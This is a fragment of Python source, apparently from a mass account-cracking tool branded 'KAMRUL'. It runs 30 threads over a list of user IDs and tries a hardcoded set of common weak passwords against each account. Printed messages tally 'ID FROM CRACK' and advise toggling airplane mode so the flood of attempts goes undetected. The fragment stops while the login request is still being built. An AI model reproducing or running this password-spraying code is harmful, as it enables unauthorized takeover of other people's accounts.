...
sys.stdout.write('\x1b]2;𓆩【KAMRUL】𓆪 \x07')
    ...
    # KAMRUL Clover Logo - Green - Version 5.00
def ____banner____():
...
def old_Tree():
    ...
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★🥰\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD 5 MIN FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
...
def login_1(uid):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789', '112233', '123123', '102030', '111222'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
